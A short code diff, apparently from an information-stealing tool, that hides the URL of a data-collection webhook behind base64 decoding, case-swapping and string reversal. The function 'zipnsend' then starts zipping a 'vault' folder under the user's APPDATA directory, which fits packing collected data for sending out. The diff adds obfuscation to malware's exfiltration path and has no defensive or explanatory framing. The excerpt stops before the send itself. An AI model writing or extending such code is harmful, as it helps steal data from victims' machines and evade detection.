@@ -1,6 +1,10 @@
 import os, zipfile, shutil, requests
-from co.config import WEBHOOK_URL
-import time
+from co.config import WEBHOOK_URI
+import time, base64
+decoded_uri = base64.b64decode(WEBHOOK_URI).decode('utf-8')
+swapped_case = decoded_uri.swapcase()
+reversed_uri = swapped_case[::-1]
+WEBHOOK_URL = reversed_uri
 def zipnsend():
     vault_folder = os.path.join(os.getenv('APPDATA'), 'vault')
     zip_file_path = os.path.join(os.getenv('APPDATA'), 'vault.zip')
